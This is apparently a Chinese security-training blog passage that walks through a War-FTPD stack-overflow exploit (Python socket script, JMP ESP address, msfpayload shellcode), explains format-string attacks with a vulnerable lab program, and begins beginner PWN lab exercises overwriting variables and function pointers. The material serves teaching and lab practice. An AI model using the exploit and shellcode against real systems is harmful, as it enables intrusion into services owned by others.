利用Immunity Debugger的mona插件来生成1000个字节。 1!mona pattern_create 1000 命令执行后会在这个目下C:\\Program Files\\Immunity Inc\\Immunity Debugger 生成pattern.txt，里面存放了1000 bytes的junkcode. 点击左上角的闪电，打开21端口。 利用python编写一个Socket程序将这些字节赋值给username段，发送给var-ftpd使之溢出。 1234567891011121314151617181920#coding:utf-8import socket#生成的1000个字节pattern = &#x27;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B&#x27;#TCP流套接字s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#建立连接s.connect((&#x27;127.0.0.1&#x27;,21))data = s.recv(1024)print &#x27;connect...&#x27;#在用户名处填充patterns.send(&#x27;USER &#x27;+pattern+&#x27;\\r\\n&#x27;)data = s.recv(1024)s.send(&#x27;PASS &#x27;+&#x27;123456&#x27;+&#x27;\\r\\n&#x27;)s.close()print &#x27;finish!&#x27; 发送后，Immunity Debugger调试器跟踪如下： ESP&#x3D;71413471，EIP&#x3D;32714131 现在计算这两个地址在1000字节字符串中的偏移地址，依旧使用mona插件。 可知EIP偏移为485，ESP偏移为493。这意味着485个字节后的EIP寄存器开始被缓冲区覆盖那么EIP中486-489字节是我们想要的目标。 CPU通过EIP寄存器中的值知道下一个要运行的指令，在内存地址中运行这些当前的指令，在EIP的内存位置中使用JMP ESP指令使CPU来执行指令和“跳”到ESP寄存器中执行驻留在该地址的内存中的指令。我们的目的就是在EIP中使用JMP ESP指令，这样我们就能控制执行命令并把我们的代码转变到ESP寄存器中。 两个寄存器之间有8个字节，于是我们用4个字节来填充我们的缓冲区，缩小间距和连接到ESP寄存器。我们使用保持1000字节边界的框架漏洞来调整缓冲区： 123456789101112131415161718192021#coding:utf-8import socket#Fuzz stringpattern = &quot;\\x41&quot;*485 + &quot;\\x42\\x42\\x42\\x42&quot; + &quot;\\x43&quot;*4 + &quot;\\x44&quot;*507#TCP流套接字s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#建立连接s.connect((&#x27;127.0.0.1&#x27;,21))data = s.recv(1024)print &#x27;connect...&#x27;#在用户名处填充patterns.send(&#x27;USER &#x27;+pattern+&#x27;\\r\\n&#x27;)data = s.recv(1024)s.send(&#x27;PASS &#x27;+&#x27;123456&#x27;+&#x27;\\r\\n&#x27;)s.close()print &#x27;finish!&#x27; 在Immunity debugger中重启FTP服务器，按播放键取消暂停的应用程序。 将更改后的程序运行，调试器跟踪如下: 如预期一样，EIP存储了4个42，EIP到ESP间填充了4个43。得到ESP开始和结束的内存地址：start：00AEFD48 end：00AEFF3F。00AEFF3F-00AEFD48转换十进制后计算得知为487，意味着可以用487个字节来存放shellcode。 构造ShellCode现在，我们有了目标内存地址和指令，我们需要一种方法获得从EIP寄存器到ESP寄存器的指令，为了做到这一点，我们可以在windows操作系统的DLL中使用现有的JMP ESP指令。 单击Immunity debugger器的工具栏上的“e”，在存在的windows dll中查找JMP ESP指令，之后双击一个DLL，右键单击“搜索”，选择“command”，之后键入“JMP ESP”。在kernel32.dll系统文件中发现了我们要找的指令，然后记下JMP ESP的内存地址。 EIP中包含JMP ESP的目标地址(7C86467B)和我们的CCs在ESP(00AEFD48)开始。现在，我们控制执行命令，剩下的就是用shellcode替换掉占位的CCs。 构造漏洞利用的登录用户名字符串，如下所示 使用metasploit的msfpayload来创建payload。有一点要注意：因为我们传递的都是字符串，我们必须要遵守字符限制的FTP 协议。这就意味着没有空，返回，换行，或是@符号，他们用16进制的表示为\\x00, \\x0d, \\x0a, 0×40。”\\x40\\xff\\x3d\\x20”可以阻止shellcode执行。 123456789101112131415161718192021222324252627282930313233shellcode=&quot;\\xbf\\x4d\\xd5\\x02\\xce\\xdb\\xc0\\xd9\\x74\\x24\\xf4\\x58\\x29\\xc9&quot;shellcode+=&quot;\\xb1\\x33\\x31\\x78\\x15\\x03\\x78\\x15\\x83\\xc0\\x04\\xe2\\xb8\\x29&quot;shellcode+=&quot;\\xea\\x47\\x42\\xd2\\xeb\\x37\\xcb\\x37\\xda\\x65\\xaf\\x3c\\x4f\\xba&quot;shellcode+=&quot;\\xa4\\x11\\x7c\\x31\\xe8\\x81\\xf7\\x37\\x24\\xa5\\xb0\\xf2\\x12\\x88&quot;shellcode+=&quot;\\x41\\x33\\x9a\\x46\\x81\\x55\\x66\\x95\\xd6\\xb5\\x57\\x56\\x2b\\xb7&quot;shellcode+=&quot;\\x90\\x8b\\xc4\\xe5\\x49\\xc7\\x77\\x1a\\xfe\\x95\\x4b\\x1b\\xd0\\x91&quot;shellcode+=&quot;\\xf4\\x63\\x55\\x65\\x80\\xd9\\x54\\xb6\\x39\\x55\\x1e\\x2e\\x31\\x31&quot;shellcode+=&quot;\\xbe\\x4f\\x96\\x21\\x82\\x06\\x93\\x92\\x71\\x99\\x75\\xeb\\x7a\\xab&quot;shellcode+=&quot;\\xb9\\xa0\\x45\\x03\\x34\\xb8\\x82\\xa4\\xa7\\xcf\\xf8\\xd6\\x5a\\xc8&quot;shellcode+=&quot;\\x3b\\xa4\\x80\\x5d\\xd9\\x0e\\x42\\xc5\\x39\\xae\\x87\\x90\\xca\\xbc&quot;shellcode+=&quot;\\x6c\\xd6\\x94\\xa0\\x73\\x3b\\xaf\\xdd\\xf8\\xba\\x7f\\x54\\xba\\x98&quot;shellcode+=&quot;\\x5b\\x3c\\x18\\x80\\xfa\\x98\\xcf\\xbd\\x1c\\x44\\xaf\\x1b\\x57\\x67&quot; +shellcode+=&quot;\\xa4\\x1a\\x3a\\xe2\\x3b\\xae\\x41\\x4b\\x3b\\xb0\\x49\\xfc\\x54\\x81&quot; +shellcode+=&quot;\\xc2\\x93\\x23\\x1e\\x01\\xd0\\xdc\\x54\\x0b\\x71\\x75\\x31\\xde\\xc3&quot; +shellcode+=&quot;\\x18\\xc2\\x35\\x07\\x25\\x41\\xbf\\xf8\\xd2\\x59\\xca\\xfd\\x9f\\xdd&quot; +shellcode+=&quot;\\x27\\x8c\\xb0\\x8b\\x47\\x23\\xb0\\x99\\x24\\xae\\x2a\\x02\\x85\\x5b&quot; +shellcode+=&quot;\\x93\\x21\\xb8\\xf7\\xb0\\xa5&quot; 在shellcode前添加了10个NOP，使之更好执行流程到它的最终目标。 pattern &#x3D; “\\x41”485 + “\\x7B\\x46\\x86\\x7C” + “\\x42”4 + “\\x90”10”+ shellcode \\xCC”*267 (497-230(shellcode长度)) 将构造好的EXP发送给开放21端口且运行war-ftpd的XP本机： 格式化字符串背景格式化字符串漏洞是一个很古老的漏洞了，现在几乎已经见不到这类漏洞的身影，但是作为漏洞分析的初学者来说，还是很有必要研究一下的。 格式化字符串漏洞是由像printf(user_input)这样的代码引起的，其中user_input是用户输入的数据，具有Set-UID root权限的这类程序在运行的时候，printf语句将会变得非常危险，因为它可能会导致下面的结果： 1.使得程序崩溃 2.任意一块内存读取数据 3.修改任意一块内存里的数据 最后一种结果是非常危险的，因为它允许用户修改set-UID root程序内部变量的值，从而改变这些程序的行为。 1printf (&quot;The magic number is: %d&quot;, 1911); 试观察运行以上语句，会发现字符串”The magic number is: %d”中的格式符％d被参数（1911）替换，因此输出变成了“The magic number is: 1911”。 格式化函数的行为由格式化字符串控制，printf函数从栈上取得参数。 如果参数数量不匹配会发生什么？ 如果只有一个不匹配会发生什么？ printf (“a has value %d, b has value %d, c is at address: %08x\\n”,a, b); 1，在上面的例子中格式字符串需要3个参数，但程序只提供了2个。 2，该程序能够通过编译么？ ⑴printf()是一个参数长度可变函数。因此，仅仅看参数数量是看不出问题的。 ⑵为了查出不匹配，编译器需要了解printf()的运行机制，然而编译器通常不做这类分析。 ⑶有些时候，格式字符串并不是一个常量字符串，它在程序运行期间生成(比如用户输入)，因此，编译器无法发现不匹配。 3，那么printf()函数自身能检测到不匹配么？ ⑴printf()从栈上取得参数，如果格式字符串需要3个参数，它会从栈上取3个，除非栈被标记了边界，printf()并不知道自己是否会用完提供的所有参数。 ⑵既然没有那样的边界标记。printf()会持续从栈上抓取数据，在一个参数数量不匹配的例子中，它会抓取到一些不属于该函数调用到的数据。 4，如果有人特意准备数据让printf抓取会发生什么呢？ 访问任意位置内存 1，我们需要得到一段数据的内存地址，但我们无法修改代码，供我们使用的只有格式字符串。 2，如果我们调用 printf(%s) 时没有指明内存地址, 那么目标地址就可以通过printf函数，在栈上的任意位置获取。printf函数维护一个初始栈指针,所以能够得到所有参数在栈中的位置 3，观察: 格式字符串位于栈上. 如果我们可以把目标地址编码进格式字符串，那样目标地址也会存在于栈上，在接下来的例子里，格式字符串将保存在栈上的缓冲区中。 123456789101112131415int main(int argc, char *argv[]) &#123; char user_input[100]; ... ... /* other variable definitions and statements */ scanf(&quot;%s&quot;, user_input); /* getting a string from user */ printf(user_input); /* Vulnerable place */ return 0; &#125; 4，如果我们让printf函数得到格式字符串中的目标内存地址 (该地址也存在于栈上), 我们就可以访问该地址. printf (“\\x10\\x01\\x48\\x08 %x %x %x %x %s”); 5，\\x10\\x01\\x48\\x08 是目标地址的四个字节， 在C语言中, \\x10 告诉编译器将一个16进制数0×10放于当前位置（占1字节）。如果去掉前缀\\x10就相当于两个ascii字符1和0了，这就不是我们所期望的结果了。 6，%x 导致栈指针向格式字符串的方向移动 7，下图解释了攻击方式，如果用户输入中包含了以下格式字符串 如图所示，我们使用四个%x来移动printf函数的栈指针到我们存储格式字符串的位置，一旦到了目标位置，我们使用％s来打印，它会打印位于地址0×10014808的内容，因为是将其作为字符串来处理，所以会一直打印到结束符为止。 user_input数组到传给printf函数参数的地址之间的栈空间不是为了printf函数准备的。但是，因为程序本身存在格式字符串漏洞，所以printf会把这段内存当作传入的参数来匹配％x。 最大的挑战就是想方设法找出printf函数栈指针(函数取参地址)到user_input数组的这一段距离是多少，这段距离决定了你需要在%s之前输入多少个%x。 在内存中写一个数字 %n: 该符号前输入的字符数量会被存储到对应的参数中去 123int i;printf (&quot;12345%n&quot;, &amp;i); 1，数字5（%n前的字符数量）将会被写入i 中 2，运用同样的方法在访问任意地址内存的时候，我们可以将一个数字写入指定的内存中。只要将%s替换成%n就能够覆盖0×10014808的内容。 3，利用这个方法，攻击者可以做以下事情: 重写程序标识控制访问权限 重写栈或者函数等等的返回地址 4，然而，写入的值是由%n之前的字符数量决定的。真的有办法能够写入任意数值么？ 用最古老的计数方式， 为了写1000，就填充1000个字符吧。 为了防止过长的格式字符串，我们可以使用一个宽度指定的格式指示器。(比如（%0数字x）就会左填充预期数量的0符号) 利用格式化字符串漏洞用户需要输入一段数据，数据保存在user_input数组中，程序会使用printf函数打印数据内容，并且该程序以root权限运行。这个程序存在一个格式化漏洞。 程序内存中存在两个秘密值，我们想要知道这两个值，但发现无法通过读二进制代码的方式来获取它们（实验中为了简单起见，硬编码这些秘密值为0x44和0x55）。尽管我们不知道它们的值，但要得到它们的内存地址倒不是特别困难，因为对大多数系统而言，每次运行程序，这些内存地址基本上是不变的。实验假设我们已经知道了这些内存地址，为了达到这个目的，程序特意为我们打出了这些地址。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475/* vul_prog.c */ #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #define SECRET1 0x44 #define SECRET2 0x55 int main(int argc, char *argv[]) &#123; char user_input[100]; int *secret; long int_input; int a, b, c, d; /* other variables, not used here.*/ /* The secret value is stored on the heap */ secret = (int *) malloc(2*sizeof(int)); /* getting the secret */ secret[0] = SECRET1; secret[1] = SECRET2; printf(&quot;The variable secret&#x27;s address is 0x%8x (on stack)\\n&quot;, &amp;secret); printf(&quot;The variable secret&#x27;s value is 0x%8x (on heap)\\n&quot;, secret); printf(&quot;secret[0]&#x27;s address is 0x%8x (on heap)\\n&quot;, &amp;secret[0]); printf(&quot;secret[1]&#x27;s address is 0x%8x (on heap)\\n&quot;, &amp;secret[1]); printf(&quot;Please enter a decimal integer\\n&quot;); scanf(&quot;%d&quot;, &amp;int_input); /* getting an input from user */ printf(&quot;Please enter a string\\n&quot;); scanf(&quot;%s&quot;, user_input); /* getting a string from user */ /* Vulnerable place */ printf(user_input); printf(&quot;\\n&quot;); /* Verify whether your attack is successful */ printf(&quot;The original secrets: 0x%x -- 0x%x\\n&quot;, SECRET1, SECRET2); printf(&quot;The new secrets: 0x%x -- 0x%x\\n&quot;, secret[0], secret[1]); return 0; &#125; 实验环境是64位系统，所以需要使用%016llx才能读取整个字。 找出secret[0]的值 1.首先定位int_input的位置，这样就确认了％s在格式字符串中的位置。 2.输入secret[0]的地址，记得做进制转换(22003732)，同时在格式字符串中加入％s。 获取到D–0x44。 3.修改为任意值 其中，%.880u限定了字符零填充到880个大小，%n往目标地址写入在此之前的字符数量","categories":[{"name":"PWN","slug":"PWN","permalink":"https://qianmuoy.github.io/categories/PWN/"}],"tags":[]},{"title":"PWN实战","slug":"PWN实战","date":"2024-03-09T12:33:11.000Z","updated":"2024-03-09T12:33:26.126Z","comments":true,"path":"2024/03/09/PWN实战/","link":"","permalink":"https://qianmuoy.github.io/2024/03/09/PWN%E5%AE%9E%E6%88%98/","excerpt":"","text":"PWN一般溢出背景主机&#x2F;home&#x2F;test&#x2F;1目录下有一个pwn1程序，执行这个程序的时候可以输入数据进行测试，pwn1程序会输出Please try again.的提示信息，请对pwn1程序进行逆向分析和调试，找到程序内部的漏洞，并构造特殊的输入数据，使之输出Congratulations, you pwned it.信息。 12345678910111213141516171819#include &lt;stdio.h&gt;int main(int argc, char** argv)&#123; int modified; char buffer[64]; modified = 0; gets(buffer); // 引发缓冲区溢出 if (modified != 0) &#123; printf(&quot;Congratulations, you pwned it.\\n&quot;); &#125; else &#123; printf(&quot;Please try again.\\n&quot;); &#125; return 0;&#125; 使用gets函数读取输入数据时，并不会对buffer缓冲区的长度进行检查，输入超长的输入数据时会引发缓冲区溢出。 工具gdb调试器 执行gdb pwn1即可开始通过gdb对pwn1进行调试，现在我们需要阅读main函数的汇编代码，在gdb中执行disas main命令即可： 12gdb pwn1disas main 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950510x080482a0 &lt;+0&gt;: push %ebp0x080482a1 &lt;+1&gt;: mov %esp,%ebp0x080482a3 &lt;+3&gt;: and $0xfffffff0,%esp; esp = esp - 0x60，即在栈上分配0x60）字节的空间0x080482a6 &lt;+6&gt;: sub $0x60,%esp; modified变量位于esp + 0x5C处，将其初始化为00x080482a9 &lt;+9&gt;: movl $0x0,0x5c(%esp); buffer位于esp + 0x1C处0x080482b1 &lt;+17&gt;: lea 0x1c(%esp),%eax0x080482b5 &lt;+21&gt;: mov %eax,(%esp); 调用gets(buffer)读取输入数据0x080482b8 &lt;+24&gt;: call 0x8049360 &lt;gets&gt;; 判断modified变量的值是否是00x080482bd &lt;+29&gt;: cmpl $0x0,0x5c(%esp); 如果modified的值等于0，就跳转到 0x080482d20x080482c2 &lt;+34&gt;: je 0x80482d2 &lt;main+50&gt;; modified不为0，打印成功提示0x080482c4 &lt;+36&gt;: movl $0x80b3eec,(%esp)0x080482cb &lt;+43&gt;: call 0x8049500 &lt;puts&gt;0x080482d0 &lt;+48&gt;: jmp 0x80482de &lt;main+62&gt;; modified为0，打印失败提示0x080482d2 &lt;+50&gt;: movl $0x80b3f0b,(%esp)0x080482d9 &lt;+57&gt;: call 0x8049500 &lt;puts&gt;0x080482de &lt;+62&gt;: mov $0x0,%eax0x080482e3 &lt;+67&gt;: leave0x080482e4 &lt;+68&gt;: ret 通过对上面的汇编代码进行分析，我们知道buffer位于esp+0x1C处，而modified位于esp+0x5C处，两个地址的距离为0x5C - 0x1C &#x3D; 0x40，即64，刚好为buffer数组的大小。因此当我们输入的数据超过64字节时，modified变量就可以被覆盖。 下面在gdb中进行验证，在gdb中执行b *0x080482bd命令对gets的下一条指令下一个断点，执行r命令，让被调试的pwn1程序跑起来，就可以输入数据进行测试了，这里我们输入64个A以及1个B（即 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB），按下 Enter键程序就在断点处断下了： 12b *0x080482bdr 在gdb中输入x $esp+0x5C，查看modified变量的值已经被修改成了0x00000042，而0x42就是字符’B’的ASCII值，表明我们成功用输入数据的第65个字节覆盖了modified变量： 在gdb中连续多次执行ni命令，可以看到je指令没有跳转，说明modified的值不为0，程序进入输出通过信息的if语句分支： 使用c命令让程序执行下去。 下面我们就可以通过构造输入数据进行攻击了。输入q命令就可以退出gdb，ctrl+L清空当前命令窗口。 通过python语句构造输入数据，然后通过管道传给pwn1程序，执行命令 1python -c &quot;print &#x27;A&#x27;*64+&#x27;B&#x27;&quot; | ./pwn1 成功通过。 精确覆盖变量数据背景 C语言的main函数拥有两个参数，为int类型的argc参数，以及char**类型argv参数。其中argc参数的值表示命令行参数的个数，而argv则指向一个字符串数组，该数组存储了具体的命令行参数的内容。注意程序本身的名字为命令行的第一个参数。 打印命令行参数信息的示例代码： 12345678910111213141516171819#include &lt;stdio.h&gt;int main(int argc, char** argv)&#123; int i; for (i = 0; i &lt; argc; ++i) &#123; printf(&quot;argv[%d] = %s\\n&quot;, i, argv[i]); &#125; return 0;&#125; 编译这段代码生成test程序，然后在命令行下执行，尝试传入命令行参数，如：.&#x2F;test hello world cmdline，可以看到程序打印出具体的命令行参数信息。 Linux的xargs命令可以将输入数据当做命令行参数传给指定的程序。比如执行命令python -c “print ‘AAA BBB CCC’” | xargs .&#x2F;test后，输出： python语句执行后输出AAA BBB CCC，通过管道操作作为xargs命令的输入，而xargs将其作为test程序的命令行参数，因此test程序会把这些信息打印出来。 小端序 主机&#x2F;home&#x2F;test&#x2F;2目录下有一个pwn2程序，这个程序会对传入的命令行参数进行处理，通过构造特定的命令行参数数据可以对程序发起溢出攻击，成功会提示Congratulations, you pwned it.，失败则会提示Please try again.的提示信息。 利用缓冲区溢出改写变量的值执行gdb pwn2即可开始通过gdb对pwn2进行调试，现在我们需要阅读main函数的汇编代码，在gdb中执行disas main命令： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586870x080482a0 &lt;+0&gt;: push %ebp0x080482a1 &lt;+1&gt;: mov %esp,%ebp0x080482a3 &lt;+3&gt;: and $0xfffffff0,%esp; esp = esp - 0x60，即在栈上分配0x60）字节的空间0x080482a6 &lt;+6&gt;: sub $0x60,%esp; 判断命令行参数的个数是否为10x080482a9 &lt;+9&gt;: cmpl $0x1,0x8(%ebp)0x080482ad &lt;+13&gt;: jne 0x80482c7 &lt;main+39&gt;0x080482af &lt;+15&gt;: movl $0x80b3dac,(%esp)0x080482b6 &lt;+22&gt;: call 0x80493c0 &lt;puts&gt;0x080482bb &lt;+27&gt;: movl $0x1,(%esp)0x080482c2 &lt;+34&gt;: call 0x8048e90 &lt;exit&gt;; 命令参数个数不是1，说明传入了命令行参数; modified变量位于esp + 0x5C处，将其初始化为00x080482c7 &lt;+39&gt;: movl $0x0,0x5c(%esp); 通过ebp + 0xC获取argv参数的值0x080482cf &lt;+47&gt;: mov 0xc(%ebp),%eax; eax = eax + 40x080482d2 &lt;+50&gt;: add $0x4,%eax; 取argv[1]的值0x080482d5 &lt;+53&gt;: mov (%eax),%eax; 将argv[1]作为strcpy的第二个参数值0x080482d7 &lt;+55&gt;: mov %eax,0x4(%esp); buffer位于esp + 0x1C处，buffer作为strcpy的第一个参数值0x080482db &lt;+59&gt;: lea 0x1c(%esp),%eax0x080482df &lt;+63&gt;: mov %eax,(%esp); 调用strcpy进行字符串复制0x080482e2 &lt;+66&gt;: call 0x80525b0 &lt;strcpy&gt;; 判断modified的值是否为0x616263640x080482e7 &lt;+71&gt;: cmpl $0x61626364,0x5c(%esp); 不相等则跳转并输出失败信息0x080482ef &lt;+79&gt;: jne 0x80482ff &lt;main+95&gt;; 输出成功提示信息0x080482f1 &lt;+81&gt;: movl $0x80b3dc8,(%esp)0x080482f8 &lt;+88&gt;: call 0x80493c0 &lt;puts&gt;0x080482fd &lt;+93&gt;: jmp 0x8048314 &lt;main+116&gt;0x080482ff &lt;+95&gt;: mov $0x80b3de8,%eax0x08048304 &lt;+100&gt;: mov 0x5c(%esp),%edx0x08048308 &lt;+104&gt;: mov %edx,0x4(%esp)0x0804830c &lt;+108&gt;: mov %eax,(%esp)0x0804830f &lt;+111&gt;: call 0x8049390 &lt;printf&gt;0x08048314 &lt;+116&gt;: mov $0x0,%eax0x08048319 &lt;+121&gt;: leave0x0804831a &lt;+122&gt;: ret 通过对上面的汇编代码进行分析，我们知道buffer位于esp+0x1C处，而modified位于esp+0x5C处，两个地址的距离为0x5C - 0x1C &#x3D; 0x40，即64，刚好为buffer数组的大小。因此当我们输入的数据超过64字节时，modified变量就可以被覆盖，但需要控制modified变量的值还需要小心的构造命令行参数。 下面在gdb中进行验证，在gdb中执行b * 0x080482e7命令对strcpy的下一条指令下一个断点 在gdb中执行r命令，如下（r后面的数据为64个A以及1234） 1r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234 即r命令后加上空格可以接一个命令行参数，用于传递给被调试的程序。按下Enter键程序就在断点处断下了： 变量值已被修改。 使用x &#x2F;4xb $esp+0x5C命令，以字节为单位查看内存中0x34333231的表示（其中&#x2F;4xb用于控制输出格式，4表示4个长度单位，x表示以16进制方式显示，b表示单位为字节）： 现在modified变量的值已经被修改成0x34333231了，结合我们的输入数据‘A….A1234’，1234为低地址往高地址方向，可以判断这是小端格式的表示法。 在gdb中输入c命令就可以让程序继续执行，看到输出了错误的提示信息： 现在我们只要合理控制命令行参数的第65~68字节的内容，就可以成功发起溢出攻击了。q退出gdb 1python -c &quot;print &#x27;A&#x27;*64+&#x27;\\x64\\x63\\x62\\x61&#x27;&quot; | xargs ./pwn2 使用管道方式传参数，pwn程序。 函数指针覆盖背景使用objdump工具可以查看一个目标文件的许多内部信息，objdump有许多可选的参数选项，通过控制这些参数选项可以输出不同的文件信息。在对二进制程序进行分析时，我们可以使用objdump获取二进制程序中代码段的反汇编指令列表，从而获取某一个函数的具体地址信息。 执行objdump -d pwn4可以看到关于pwn4程序的反汇编指令列表，其中-d选项表示进行反汇编操作。 函数指针（Function Pointer）是指向函数的指针，函数指针可以像一般函数一样，用于调用函数、传递参数。在C &#x2F;C++这样的语言中，通过提供一个简单的选取、执行函数的方法，函数指针可以简化代码。 函数指针只能指向具有特定特征的函数，因而所有被同一指针运用的函数必须具有相同的参数和返回类型。 通常使用typedef来定义一个函数指针类型，如： 1typedef void(*func)(); 定义了func这样的函数指针类型，其可以指向返回值类型为void且没有函数参数的函数，比如void test()这样的函数，可以使用func myfp &#x3D; test;来定义一个myfp变量，该变量指向test函数，通过执行myfp()可以达到执行test()函数同样的效果。 主机&#x2F;home&#x2F;test&#x2F;4目录下有一个pwn4程序，执行这个程序可以输入数据进行测试，当输入一定的数据量时，可能什么都不会提示程序就结束运行了，也可能会提示这样的信息： calling function pointer, jumping to 0x41414141 Segmentation fault 当输入的精心构造的输入数据时可对程序发起溢出攻击，达到改写程序执行流程的目的，攻击成功时将输出如下信息： calling function pointer, jumping to 0xXXXXXXXX Congratulations, you pwned it. 源代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;string.h&gt; typedef void(*func)(); void win()//输出成功提示信息的函数&#123; printf(&quot;Congratulations, you pwned it.\\n&quot;);&#125; int main(int argc,char** argv)&#123; func fp;char buffer[64]; fp =NULL; gets(buffer);// 可引发缓冲区溢出 if(fp)// 判断函数指针变量fp是否不为NULL&#123; printf(&quot;calling function pointer, jumping to 0x%08X\\n&quot;, fp); fp();//调用fp&#125;return 0;&#125; 程序定义了一个与buffer相邻的函数指针变量fp，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出，fp变量的值可以被改写，当fp的值被改写为win函数的地址时，就可以输出成功提示的信息。 利用缓冲区溢出改写函数指针一样查看主函数的反汇编 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748490x08048428 &lt;+0&gt;:push %ebp0x08048429 &lt;+1&gt;:mov %esp,%ebp0x0804842b &lt;+3&gt;:and $0xfffffff0,%esp; 在栈上开辟0x60字节的空间0x0804842e &lt;+6&gt;:sub $0x60,%esp; 初始化fp的值为NULL，其中fp位于[esp+0x5c]0x08048431 &lt;+9&gt;: movl $0x0,0x5c(%esp); 执行gets(buffer)，其中buffer位于[esp+0x1c]0x08048439 &lt;+17&gt;:lea0x1c(%esp),%eax0x0804843d &lt;+21&gt;:mov %eax,(%esp)0x08048440 &lt;+24&gt;:call0x8048320&lt;gets@plt&gt;; 判断fp是否为NULL0x08048445 &lt;+29&gt;: cmpl $0x0,0x5c(%esp)0x0804844a &lt;+34&gt;:je0x8048467&lt;main+63&gt;0x0804844c &lt;+36&gt;:mov $0x8048554,%eax0x08048451 &lt;+41&gt;:mov0x5c(%esp),%edx0x08048455 &lt;+45&gt;:mov %edx,0x4(%esp)0x08048459 &lt;+49&gt;:mov %eax,(%esp)0x0804845c &lt;+52&gt;:call0x8048340 &lt;printf@plt&gt;; 执行fp()0x08048461 &lt;+57&gt;:mov0x5c(%esp),%eax0x08048465 &lt;+61&gt;:call*%eax0x08048467 &lt;+63&gt;:mov $0x0,%eax0x0804846c &lt;+68&gt;:leave0x0804846d &lt;+69&gt;:ret 通过对上面的汇编代码进行分析，我们知道buffer位于esp+0x1c处，而fp位于esp+0x5c处，两个地址的距离为0x5c - 0x1c &#x3D; 0x40，即64，刚好为buffer数组的大小。因此当输入数据的长度超过64字节时，fp变量就可以被覆盖，但需要控制fp变量的值还需要小心的构造数据。我们只要合理控制环境变量参数的第65~68字节的内容，就可以成功发起溢出攻击了。 现在的问题是找到函数win的地址信息，然后将fp的值改写为win函数的地址，这样就可以达到调用win函数的目的了。前面提到过使用objdump可以查看函数的地址 1objdump -d pwn4 在输出信息中找到win函数的信息： 或者可以跟着用grep命令，快速找到那一行 1objdump -d pwn4 | grep win 可以看到win函数的地址为0x08048414，因为机器采用小端格式，因此执行下面的语句就可以成功发起溢出攻击了： 1python -c &quot;print &#x27;A&#x27;*64+&#x27;\\x14\\x84\\x04\\x08&#x27;&quot; | ./pwn4 返回地址覆盖背景函数调用约定描述了函数传递参数的方式和栈协同工作的技术细节，不同的函数调用约定原理基本相同，但在细节上是有差别的，包括函数参数的传递方式、参数的入栈顺序、函数返回时由谁来平衡堆栈扥。本实验中着重讲解C语言函数调用约定。 通过前面几个PWN系列实验的学习，也许你已经发现了在gdb中通过disas指令对main函数进行反汇编时，函数的开头和结尾的反汇编指令都是一样的： push %ebp mov %esp,%ebp …… leave ret 在函数的开头，首先是一条push %ebp指令，将ebp寄存器压入栈中，用于保存ebp寄存器的值，接着是mov %esp,%ebp将esp寄存器的值传递给ebp寄存器；在函数的末尾，leave指令相当于mov %ebp,%esp和pop %ebp两条指令，其作用刚好与开头的两条指令相反，即恢复esp和ebp寄存器的内容。 如果在函数A中调用了函数B，我们称函数A为主调函数，函数B为被调函数，如果函数B的声明为int B(int arg1, int arg2, int arg3)，那么函数A中的调用函数B时的汇编指令的形式如下： push arg3 push arg2 push arg1 call B 连续三个push将函数的参数按照从右往左的顺序进行压栈，然后执行call B来调用函数B。注意在gdb中看到的效果可能不是三个push，而是三个mov来对栈进行操作，这是因为Linux采用AT&amp;T风格的汇编，而上面的指令使用的是Intel风格的汇编，比较容易理解。 